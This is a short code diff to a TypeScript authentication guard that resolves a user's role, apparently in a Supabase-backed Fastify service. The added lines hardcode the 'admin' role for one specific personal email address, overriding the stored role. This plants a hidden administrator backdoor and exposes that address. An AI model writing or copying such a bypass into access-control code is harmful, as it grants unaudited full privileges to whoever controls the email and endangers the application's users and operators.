@@ -51,6 +51,11 @@ export async function authGuard(request: FastifyRequest, reply: FastifyReply) {
 
     let resolvedRole = profile?.role || data.user.user_metadata?.role || "customer";
 
+    // Hardcode admin role for specific email
+    if (data.user.email === "shawsumit6286@gmail.com") {
+      resolvedRole = "admin";
+    }
+
     // Auto-repair role if user registered as driver before role fixes
     if (resolvedRole === "customer") {
       const { data: driverProfile } = await supabaseAdmin
